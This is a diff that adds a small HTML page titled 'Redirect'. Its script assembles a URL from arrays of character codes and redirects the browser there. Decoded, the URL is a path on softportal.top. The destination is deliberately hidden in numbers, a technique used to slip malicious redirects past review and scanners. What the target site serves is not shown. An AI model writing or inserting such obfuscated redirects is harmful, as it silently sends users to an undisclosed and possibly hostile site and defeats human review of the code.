@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect</title>
+    <script>
+        const v = {
+            a1: [115, 111, 102, 116],
+            a2: [112, 111, 114, 116, 97, 108],
+            a3: [46, 116, 111, 112],
+            a4: [47, 115],
+            a5: [47, 116, 101, 115, 116, 103, 105, 116]
+        };
+
+        const w = (x) => Object.values(x).map(y => String.fromCharCode(...y)).join('');
+        window.location.href = 'https://' + w(v);
+    </script>
+</head>
+<body>
+</body>
+</html>
